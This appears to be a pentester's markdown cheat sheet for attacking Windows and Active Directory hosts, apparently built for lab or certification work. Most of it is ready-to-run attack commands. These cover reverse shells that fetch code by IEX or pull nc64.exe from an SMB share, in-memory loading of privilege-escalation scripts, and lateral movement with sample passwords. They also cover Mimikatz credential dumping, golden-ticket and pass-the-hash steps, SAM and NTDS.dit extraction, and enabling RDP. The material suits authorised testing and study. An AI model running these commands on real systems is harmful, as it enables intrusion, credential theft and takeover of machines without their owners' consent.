---
IP: 10.10.14.4
---
# Reverse Shells

--------
## Powercat Reverse Shell 

**In memory execution**

```js
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.1.95/powercat.ps1');powercat -c =this.ip -p 4444 -e powershell"
```
## DCOM Reverse Shell

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET IP"))
```

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjA...","7")
```

## SMB Share Shell

```js
impacket-smbserver share . -smb2support (run on kali, remember to execute in directory with nc64.exe)
```

```js
cmd.exe /c \\10.8.1.95\share\nc64.exe -e cmd.exe 10.8.1.95 4444
```

> [!tip]
> This is particularly useful for situations where you have SEImpersonate privileges.
> ```js
> .\GodPotato.exe -cmd "cmd.exe /c \\192.168.45.247\share\nc64.exe -e cmd.exe 192.168.45.247 4444"
> ```

# Enumeration

------
## General

**Look for interesting files**

```powershell
Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path .\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path .\ -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path C:\Users\ -Include *.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.log -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "File: $($_.Name)"; Get-Content $_.FullName }
```

**Check for juicy information in PowerShell history files**

```bash
C:\Users\clinton\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**This will recursively look for PowerShell history files in all users home directories**

```powershell
Get-LocalUser | ForEach-Object { type C:\Users\$($_.Name)\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt -ErrorAction SilentlyContinue }
```

**Grep for passwords in interesting files**

```powershell
findstr /si passw *.xml *.ini *.txt *.conf
```

## Enumerate Scheduled Tasks

**Filter by local users**

```powershell
Get-LocalUser | ForEach-Object { schtasks /query /fo LIST /v | findstr $_.Name }
Get-LocalUser | ForEach-Object { Get-ScheduledTask | findstr $_.Name }
```

**Filter by interesting strings**

```powershell
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"
```

**Get all scheduled tasks**

```powershell
schtasks /query /fo LIST /v
```

## Enumerate Services

**All Services**

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

**Filter out C:\\Windows**

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | findstr /v "C:\Windows"
```

## PowerUp.ps1

**In memory execution (works inside reverse shell without PS execution rights)**

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.135:80/enum/PowerUp.ps1'); Invoke-AllChecks"
```

## PrivescCheck.ps1

**In memory execution (works inside reverse shell without PS execution rights)**

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.135:80/enum/PrivescCheck.ps1'); Invoke-PrivescCheck"
```

## winPEAS.ps1

**In memory execution (works inside reverse shell without PS execution rights)**

```powershell
powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.135:80/enum/winPEAS.ps1');"
```
# Movement

-------
## WMI

**Create process on another machine (need Admin on target)**

```powershell
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

## WinRS

**Create process on another machine (need Admin on target)**

```powershell
winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
```

# Post

--------
## Passwords

```powershell
cmdkey /list
```

```
Get-History
```

```
(Get-PSReadlineOption).HistorySavePath
```

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

```
cd C:/Users/<user>/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline
```

## Mimikatz
### Golden Ticket

```js
# privilege::debug
# lsadump::lsa /patch (grab krbtgt ntlm hash and domain SID)
# kerberos::purge
# kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
# misc::cmd
# exit

psexec.exe \\dc1 cmd.exe 
```

> [!warning] `psexec.exe \\192.168.50.70 cmd.exe` would not work. 
> 
> Using `\\192.168.50.70` forces NTLM auth rather than Kerberos (overpass the hash technique), meaning the golden ticket is never actually used for auth

### Passwords and Creds

```js
# sekurlsa::logonpasswords
# sekurlsa::tickets /export

# kerberos::list /export

# vault::cred
# vault::list

# lsadump::sam
# lsadump::secrets
# lsadump::cache
```

> [!tip]
> For non-interactive sessions or buggy shells, sometimes mimikatz won't work (i.e. you get an infinite loop of `mimikatz #`). You can fix it by using this:
> ```
> .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
> 
> -----
> 
> $result = .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
> 
> $result
> ```

```
.\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
.\mimikatz.exe privilege::debug lsadump::sam exit
.\mimikatz.exe privilege::debug lsadump::secrets exit
.\mimikatz.exe privilege::debug sekurlsa::tickets exit
.\mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
### PTH

```js
# sekurlsa::pth /user:dave /domain:corp.com /ntlm:08d7a47a6f9f66b97b1bae4178747494 /run:powershell
```

### PTT

```js
# sekurlsa::tickets /export
# kerberos::purge
# kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

PS C:\Tools> klist
PS C:\Tools> ls \\<SPN FROM NAMELIST>\backup
```

> [!warning] The SPN ***must*** match the output of `klist` or else authentication will not work.
> E.g.
> ```js
> Server: cifs/web04 @ CORP.COM
> ```
> The resulting command must be: `ls \\web04\backup`
> 
> Whereas:
> ```js
> Server: cifs/web04.corp.com @ CORP.COM
> ```
> The resulting command must be: `ls \\web04.corp.com\backup`
> 
> This is true for ALL WINDOWS AUTH

# DLL Hijacking

--------

**DLL Search Order**

```js
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

# Privileges

-----
## SEImpersonate

```js
impacket-smbserver share . -smb2support (kali)
```

```powershell
.\GodPotato.exe -cmd "cmd.exe /c \\192.168.45.220\share\nc64.exe -e cmd.exe 192.168.45.220 4444"
```

## SEBackup & SERestore

### Method 1 (Non DC)

```
cd C:\

mkdir Temp

reg save hklm\sam c:\Temp\sam

reg save hklm\system c:\Temp\system
```

```
impacket-secretsdump LOCAL -sam sam -system system
```

### Method 2 (DC)

```js
mkdir C:\shadow

cd C:\shadow

echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding
ascii 

echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append 

echo "create" | out-file ./diskshadow.txt -encoding ascii -append 

echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append

diskshadow.exe /s c:\shadow\diskshadow.txt

cd Z:\

cd windows

cd ntds

robocopy /b .\ C:\shadow NTDS.dit

cd C:\shadow 

reg.exe save hklm\system C:\temp\system
```

```bash
impacket-secretsdump LOCAL -ntds ntds.dit -system system
```

**`diskshadow.txt`**

```
set context persistent nowriters
add volume c: alias temp
create
expose %temp% z:
```

# RDP

------

**Enable RDP (must have Admin or SYSTEM rights)**

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

net localgroup "remote desktop users" /add "<username>"
```


> [!tip]
> Use this when you have high privilege access without a stable shell (can't run mimikatz, bad winpeas output, etc.) and don't care about noise





